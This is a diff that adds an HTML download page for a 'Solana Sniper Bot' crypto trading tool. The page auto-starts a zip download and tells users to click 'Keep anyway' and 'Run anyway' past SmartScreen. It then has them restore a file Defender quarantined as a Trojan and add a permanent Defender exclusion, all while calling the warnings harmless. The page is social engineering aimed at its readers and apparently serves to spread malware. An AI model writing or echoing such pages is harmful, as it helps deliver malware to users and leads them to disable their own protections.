@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Solana Sniper Bot — Install Guide & Windows Security Info</title>
+    <meta name="description" content="Your Solana Sniper Bot download is starting. If Windows SmartScreen or Defender warns about the file, here's exactly what to do. This is expected for new software.">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://solsniperbot.co/download.html">
+    <link rel="icon" type="image/png" href="software-box.png">
+    <!-- Google Analytics 4 -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4GK7MMDJ2Z"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-4GK7MMDJ2Z');
+    </script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0f;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* ==================== AUTO-DOWNLOAD BANNER ==================== */
+        .download-banner {
+            background: #14141e;
+            border-bottom: 1px solid #222230;
+            padding: 20px 20px;
+            text-align: center;
+        }
+        .download-banner .spinner {
+            display: inline-block;
+            width: 20px; height: 20px;
+            border: 3px solid #222230;
+            border-top-color: #50c878;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .download-banner .text {
+            color: #c0c0d0;
+            font-size: 15px;
+            vertical-align: middle;
+        }
+        .download-banner .text strong { color: #50c878; }
+        .download-banner .manual-link {
+            display: block;
+            margin-top: 8px;
+            color: #707088;
+            font-size: 13px;
+            text-decoration: none;
+        }
+        .download-banner .manual-link:hover { color: #a78bfa; }
+
+        /* ==================== HERO ==================== */
+        .hero {
+            background: radial-gradient(ellipse at 70% 30%, #1a1a3e 0%, #0a0a0f 60%);
+            padding: 50px 20px 30px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero h1 {
+            font-size: 32px;
+            color: #fff;
+            margin-bottom: 10px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+        .hero p {
+            color: #a0a0b8;
+            font-size: 17px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* ==================== SECTIONS ==================== */
+        .section {
+            max-width: 760px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .section h2 {
+            font-size: 24px;
+            color: #fff;
+            margin-bottom: 8px;
+            font-weight: 800;
+        }
+        .section h2 .step-num {
+            display: inline-block;
+            background: #50c878;
+            color: #0a0a0f;
+            width: 32px; height: 32px;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 32px;
+            font-size: 16px;
+            margin-right: 10px;
+        }
+        .section .subtitle {
+            color: #a0a0b8;
+            font-size: 15px;
+            margin-bottom: 24px;
+        }
+        .section p {
+            color: #c0c0d0;
+            font-size: 15px;
+            margin-bottom: 16px;
+        }
+        .section .callout {
+            background: rgba(80, 200, 120, 0.08);
+            border: 1px solid rgba(80, 200, 120, 0.2);
+            border-radius: 12px;
+            padding: 20px 24px;
+            margin: 20px 0;
+        }
+        .section .callout p { margin-bottom: 0; color: #b0d0c0; }
+        .section .callout strong { color: #50c878; }
+        .section code {
+            background: #14141e;
+            padding: 2px 8px;
+            border-radius: 4px;
+            color: #50c878;
+            font-size: 14px;
+        }
+
+        /* ==================== SMARTSCREEN MOCKUP ==================== */
+        .mockup-container {
+            margin: 24px 0;
+        }
+        .mockup-label {
+            color: #707088;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 10px;
+        }
+        .smartscreen-mockup {
+            background: #1e3a5f;
+            border: 1px solid #2a4a6f;
+            border-radius: 8px;
+            padding: 32px 24px;
+            text-align: center;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            max-width: 480px;
+            margin: 0 auto;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+        }
+        .smartscreen-mockup .shield {
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+        .smartscreen-mockup h3 {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .smartscreen-mockup .body-text {
+            color: #b0c4d8;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .smartscreen-mockup .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+        }
+        .smartscreen-mockup .btn-disabled {
+            background: transparent;
+            border: 1px solid #3a5a7f;
+            color: #707088;
+            padding: 10px 24px;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: not-allowed;
+        }
+        .smartscreen-mockup .btn-info {
+            background: #2a4a6f;
+            border: 1px solid #3a6a9f;
+            color: #c0d0e0;
+            padding: 10px 24px;
+            font-size: 14px;
+            border-radius: 4px;
+        }
+        .smartscreen-mockup .arrow-hint {
+            color: #50c878;
+            font-size: 13px;
+            margin-top: 12px;
+            font-weight: 600;
+        }
+
+        /* ==================== MORE INFO MOCKUP ==================== */
+        .smartscreen-mockup-2 {
+            background: #1e3a5f;
+            border: 1px solid #2a4a6f;
+            border-radius: 8px;
+            padding: 32px 24px;
+            text-align: center;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            max-width: 480px;
+            margin: 0 auto;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+        }
+        .smartscreen-mockup-2 .shield {
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+        .smartscreen-mockup-2 h3 {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .smartscreen-mockup-2 .body-text {
+            color: #b0c4d8;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        .smartscreen-mockup-2 .publisher {
+            color: #8090a0;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        .smartscreen-mockup-2 .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+        }
+        .smartscreen-mockup-2 .btn-run {
+            background: #2a6a3f;
+            border: 1px solid #3a8a4f;
+            color: #c0e0c8;
+            padding: 10px 24px;
+            font-size: 14px;
+            border-radius: 4px;
+        }
+        .smartscreen-mockup-2 .btn-dont {
+            background: transparent;
+            border: 1px solid #3a5a7f;
+            color: #707088;
+            padding: 10px 24px;
+            font-size: 14px;
+            border-radius: 4px;
+        }
+        .smartscreen-mockup-2 .arrow-hint {
+            color: #50c878;
+            font-size: 13px;
+            margin-top: 12px;
+            font-weight: 600;
+        }
+
+        /* ==================== DEFENDER MOCKUP ==================== */
+        .defender-mockup {
+            background: #1a1a2e;
+            border: 1px solid #2a2a3e;
+            border-radius: 8px;
+            padding: 24px;
+            max-width: 520px;
+            margin: 0 auto;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        .defender-mockup .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #2a2a3e;
+        }
+        .defender-mockup .header .icon {
+            font-size: 24px;
+        }
+        .defender-mockup .header .title {
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+        }
+        .defender-mockup .header .subtitle {
+            color: #707088;
+            font-size: 12px;
+        }
+        .defender-mockup .threat-item {
+            background: #14141e;
+            border: 1px solid #2a2a3e;
+            border-radius: 6px;
+            padding: 16px;
+            margin-bottom: 12px;
+        }
+        .defender-mockup .threat-item .threat-name {
+            color: #fbbf24;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .defender-mockup .threat-item .threat-detail {
+            color: #9090a8;
+            font-size: 13px;
+            margin-bottom: 12px;
+        }
+        .defender-mockup .threat-item .actions {
+            display: flex;
+            gap: 8px;
+        }
+        .defender-mockup .threat-item .btn-action {
+            background: #2a2a3e;
+            border: 1px solid #3a3a4e;
+            color: #c0c0d0;
+            padding: 6px 16px;
+            font-size: 13px;
+            border-radius: 4px;
+        }
+        .defender-mockup .threat-item .btn-action.primary {
+            background: #2a4a6f;
+            border-color: #3a6a9f;
+            color: #c0d0e0;
+        }
+        .defender-mockup .arrow-hint {
+            color: #50c878;
+            font-size: 13px;
+            margin-top: 12px;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        /* ==================== EXCLUSION MOCKUP ==================== */
+        .exclusion-mockup {
+            background: #1a1a2e;
+            border: 1px solid #2a2a3e;
+            border-radius: 8px;
+            padding: 24px;
+            max-width: 520px;
+            margin: 0 auto;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        .exclusion-mockup .header {
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #2a2a3e;
+        }
+        .exclusion-mockup .exclusion-item {
+            background: #14141e;
+            border: 1px solid #2a2a3e;
+            border-radius: 6px;
+            padding: 12px 16px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .exclusion-mockup .exclusion-item .icon {
+            font-size: 18px;
+        }
+        .exclusion-mockup .exclusion-item .name {
+            color: #c0c0d0;
+            font-size: 14px;
+            flex: 1;
+        }
+        .exclusion-mockup .exclusion-item .remove {
+            color: #707088;
+            font-size: 13px;
+        }
+        .exclusion-mockup .add-btn {
+            background: #2a4a6f;
+            border: 1px solid #3a6a9f;
+            color: #c0d0e0;
+            padding: 8px 20px;
+            font-size: 14px;
+            border-radius: 4px;
+            margin-top: 12px;
+            display: inline-block;
+        }
+        .exclusion-mockup .arrow-hint {
+            color: #50c878;
+            font-size: 13px;
+            margin-top: 12px;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        /* ==================== EXPECTED BEHAVIOR BOX ==================== */
+        .expected-box {
+            background: rgba(124, 58, 237, 0.08);
+            border: 1px solid rgba(124, 58, 237, 0.2);
+            border-radius: 14px;
+            padding: 28px 32px;
+            margin: 30px 0;
+        }
+        .expected-box h3 {
+            color: #a78bfa;
+            font-size: 18px;
+            margin-bottom: 12px;
+            font-weight: 700;
+        }
+        .expected-box p {
+            color: #c0c0d0;
+            font-size: 15px;
+            margin-bottom: 12px;
+        }
+        .expected-box p:last-child { margin-bottom: 0; }
+        .expected-box strong { color: #a78bfa; }
+
+        /* ==================== BACK LINK ==================== */
+        .back-link {
+            text-align: center;
+            padding: 30px 20px;
+        }
+        .back-link a {
+            color: #707088;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .back-link a:hover { color: #a78bfa; }
+
+        /* ==================== FOOTER ==================== */
+        footer {
+            text-align: center;
+            padding: 30px 20px;
+            color: #505060;
+            font-size: 13px;
+            border-top: 1px solid #1e1e2e;
+        }
+        footer a { color: #707088; text-decoration: none; }
+        footer a:hover { color: #a78bfa; }
+
+        /* ==================== RESPONSIVE ==================== */
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 24px; }
+            .section { padding: 30px 16px; }
+            .section h2 { font-size: 20px; }
+            .smartscreen-mockup, .smartscreen-mockup-2, .defender-mockup, .exclusion-mockup { padding: 20px 16px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ==================== AUTO-DOWNLOAD BANNER ==================== -->
+<div class="download-banner">
+    <span class="spinner"></span>
+    <span class="text">Your download is starting&hellip; <strong>SolanaSniperBot.zip</strong> (51 MB)</span>
+    <a href="https://solsniperbot.co/SolanaSniperBot.zip" class="manual-link" rel="nofollow">If it doesn't start automatically, click here to download manually</a>
+</div>
+
+<!-- ==================== HERO ==================== -->
+<header class="hero">
+    <h1>Download Started &mdash; What to Expect</h1>
+    <p>Your download is on its way. Windows may show security warnings because this is a new, unknown application. This is <strong style="color:#50c878">expected behavior</strong> &mdash; not a sign of malware.</p>
+</header>
+
+<!-- ==================== WHY WARNINGS APPEAR ==================== -->
+<section class="section">
+    <div class="expected-box">
+        <h3>Why is Windows warning me about this file?</h3>
+        <p>Solana Sniper Bot 4.0 is a brand-new version of this application. Windows SmartScreen and Windows Defender use <strong>reputation-based detection</strong> &mdash; they flag any new executable that hasn't been downloaded by thousands of users yet. This happens to countless legitimate indie apps, open-source tools, and fresh software releases.</p>
+        <p>As more users download and run Solana Sniper Bot, Windows will build trust in the file and these warnings will stop appearing. This is a <strong>temporary</strong> phase that all new software goes through.</p>
+        <p>The warnings you see are <strong>not</strong> indicating actual malware. They are Windows being cautious about an unknown file &mdash; which is exactly what a good security system should do. You simply need to tell Windows that you trust this download.</p>
+    </div>
+</section>
+
+<!-- ==================== STEP 1: BROWSER WARNING ==================== -->
+<section class="section" style="padding-top: 0;">
+    <h2><span class="step-num">1</span>Browser Download Warning</h2>
+    <p class="subtitle">Your browser may say the file is "not commonly downloaded."</p>
+    <p>This is normal. Click <strong>Keep</strong> or <strong>Keep anyway</strong> to save the file.</p>
+    <div class="callout">
+        <p><strong>What to do:</strong> Click "Keep" or "Keep anyway" in your browser's download bar.</p>
+    </div>
+</section>
+
+<!-- ==================== STEP 2: EXTRACT ZIP ==================== -->
+<section class="section" style="padding-top: 0;">
+    <h2><span class="step-num">2</span>Extract the Zip File</h2>
+    <p class="subtitle">The download is a .zip file. Extract it to get the .exe.</p>
+    <p>Right-click <code>SolanaSniperBot.zip</code> and select <strong>Extract All</strong>. You'll get <code>SolanaSniperBot.exe</code> inside the extracted folder.</p>
+    <div class="callout">
+        <p><strong>What to do:</strong> Right-click the zip &rarr; "Extract All" &rarr; open the extracted folder &rarr; double-click <code>SolanaSniperBot.exe</code>.</p>
+    </div>
+</section>
+
+<!-- ==================== STEP 3: SMARTSCREEN ==================== -->
+<section class="section" style="padding-top: 0;">
+    <h2><span class="step-num">3</span>Windows SmartScreen Warning</h2>
+    <p class="subtitle">When you run the .exe, SmartScreen may show this screen. This is expected for all new software.</p>
+
+    <div class="mockup-container">
+        <div class="mockup-label">What you'll see:</div>
+        <div class="smartscreen-mockup">
+            <div class="shield">&#128737;</div>
+            <h3>Windows protected your PC</h3>
+            <p class="body-text">Microsoft Defender SmartScreen prevented an unrecognized app from starting. Running this app might put your PC at risk.</p>
+            <div class="buttons">
+                <span class="btn-disabled">Don't run</span>
+                <span class="btn-info">More info</span>
+            </div>
+            <div class="arrow-hint">&uarr; Click "More info"</div>
+        </div>
+    </div>
+
+    <p>Click <strong>More info</strong>, then you'll see the next screen:</p>
+
+    <div class="mockup-container">
+        <div class="mockup-label">After clicking "More info":</div>
+        <div class="smartscreen-mockup-2">
+            <div class="shield">&#128737;</div>
+            <h3>Windows protected your PC</h3>
+            <p class="body-text">Microsoft Defender SmartScreen prevented an unrecognized app from starting.</p>
+            <p class="publisher">Publisher: Unknown Publisher<br>App: SolanaSniperBot.exe</p>
+            <div class="buttons">
+                <span class="btn-run">Run anyway</span>
+                <span class="btn-dont">Don't run</span>
+            </div>
+            <div class="arrow-hint">&uarr; Click "Run anyway"</div>
+        </div>
+    </div>
+
+    <div class="callout">
+        <p><strong>What to do:</strong> Click "More info" &rarr; Click "Run anyway". The app will launch normally.</p>
+    </div>
+</section>
+
+<!-- ==================== STEP 4: DEFENDER (if it blocks) ==================== -->
+<section class="section" style="padding-top: 0;">
+    <h2><span class="step-num">4</span>If Windows Defender Blocks It</h2>
+    <p class="subtitle">In some cases, Defender may quarantine the file. This is rare but can happen with heuristic detection.</p>
+
+    <div class="mockup-container">
+        <div class="mockup-label">What you'll see in Windows Security:</div>
+        <div class="defender-mockup">
+            <div class="header">
+                <span class="icon">&#128737;</span>
+                <div>
+                    <div class="title">Protection history</div>
+                    <div class="subtitle">Threats found and remediated</div>
+                </div>
+            </div>
+            <div class="threat-item">
+                <div class="threat-name">Trojan:Win32/Wacatac.B!ml</div>
+                <div class="threat-detail">Status: Quarantined &middot; Detected: Heuristic analysis<br><span style="color:#707088;font-size:12px">This is a heuristic (machine learning) detection, not a confirmed threat. It flags unknown executables based on behavioral patterns common in malware &mdash; patterns also common in legitimate trading software.</span></div>
+                <div class="actions">
+                    <span class="btn-action primary">Actions</span>
+                    <span class="btn-action">Remove</span>
+                </div>
+            </div>
+            <div class="arrow-hint">&uarr; Click "Actions" &rarr; "Allow on device"</div>
+        </div>
+    </div>
+
+    <p>To restore the file:</p>
+    <p>1. Open <strong>Windows Security</strong> &rarr; <strong>Virus &amp; threat protection</strong> &rarr; <strong>Protection history</strong></p>
+    <p>2. Click the blocked item (e.g., "Trojan:Win32/Wacatac.B!ml")</p>
+    <p>3. Click <strong>Actions</strong> &rarr; <strong>Allow on device</strong></p>
+    <p>4. Run <code>SolanaSniperBot.exe</code> again</p>
+
+    <div class="callout">
+        <p><strong>What to do:</strong> Windows Security &rarr; Virus &amp; threat protection &rarr; Protection history &rarr; click the blocked item &rarr; Actions &rarr; Allow on device.</p>
+    </div>
+</section>
+
+<!-- ==================== STEP 5: ADD EXCLUSION (alternative) ==================== -->
+<section class="section" style="padding-top: 0;">
+    <h2><span class="step-num">5</span>Alternative: Add an Exclusion</h2>
+    <p class="subtitle">If Defender keeps blocking the file, add it as an exclusion so it's permanently trusted.</p>
+
+    <div class="mockup-container">
+        <div class="mockup-label">Add an exclusion in Windows Security:</div>
+        <div class="exclusion-mockup">
+            <div class="header">Exclusions</div>
+            <p style="color:#9090a8;font-size:13px;margin-bottom:16px">Microsoft Defender won't scan items you've excluded.</p>
+            <div class="exclusion-item">
+                <span class="icon">&#128193;</span>
+                <span class="name">P:\snipe-bot\dist\SolanaSniperBot.exe</span>
+                <span class="remove">Remove</span>
+            </div>
+            <div class="exclusion-item">
+                <span class="icon">&#128193;</span>
+                <span class="name">C:\Users\...\Downloads\SolanaSniperBot.exe</span>
+                <span class="remove">Remove</span>
+            </div>
+            <span class="add-btn">+ Add an exclusion</span>
+            <div class="arrow-hint">&uarr; Add &rarr; File &rarr; select SolanaSniperBot.exe</div>
+        </div>
+    </div>
+
+    <p>1. Open <strong>Windows Security</strong> &rarr; <strong>Virus &amp; threat protection</strong></p>
+    <p>2. Under <strong>Virus and threat protection settings</strong>, click <strong>Manage settings</strong></p>
+    <p>3. Scroll to <strong>Exclusions</strong> &rarr; click <strong>Add or remove exclusions</strong></p>
+    <p>4. Click <strong>Add an exclusion</strong> &rarr; <strong>File</strong> &rarr; select <code>SolanaSniperBot.exe</code></p>
+
+    <div class="callout">
+        <p><strong>What to do:</strong> Windows Security &rarr; Virus &amp; threat protection &rarr; Manage settings &rarr; Add or remove exclusions &rarr; Add an exclusion &rarr; File &rarr; select SolanaSniperBot.exe.</p>
+    </div>
+</section>
+
+<!-- ==================== EXPECTED BEHAVIOR SUMMARY ==================== -->
+<section class="section" style="padding-top: 0;">
+    <div class="expected-box">
+        <h3>This is expected. Here's why:</h3>
+        <p><strong>SmartScreen reputation:</strong> Windows flags any .exe that hasn't been downloaded thousands of times. Solana Sniper Bot is new, so it has no reputation yet.</p>
+        <p><strong>Heuristic detection:</strong> Defender's "Wacatac.B!ml" is a machine-learning flag, not a confirmed virus. The "!ml" suffix literally means "machine learning" &mdash; it's a guess based on behavioral patterns, not a definitive identification.</p>
+        <p><strong>Common with trading software:</strong> Crypto trading bots, screen recorders, game mods, and many legitimate tools trigger these same warnings when they're new.</p>
+        <p><strong>Temporary:</strong> As more users download and run the app, Windows builds trust automatically. Within weeks to months, these warnings will stop appearing on their own.</p>
+    </div>
+</section>
+
+<!-- ==================== BACK LINK ==================== -->
+<div class="back-link">
+    <a href="https://solsniperbot.co/">&larr; Back to Solana Sniper Bot</a>
+</div>
+
+<!-- ==================== FOOTER ==================== -->
+<footer>
+    Solana Sniper Bot &mdash; Proprietary Software. Use at your own risk.<br>
+    &copy; 2026 Solana Sniper Bot. All rights reserved.<br>
+    <a href="https://solsniperbot.co/">solsniperbot.co</a> &middot; <a href="mailto:admin@solsniperbot.co">admin@solsniperbot.co</a>
+</footer>
+
+<!-- ==================== AUTO-DOWNLOAD SCRIPT ==================== -->
+<script>
+    // Auto-start download after 1.5 seconds
+    setTimeout(function() {
+        window.location.href = 'https://solsniperbot.co/SolanaSniperBot.zip';
+    }, 1500);
+</script>
+
+</body>
+</html>
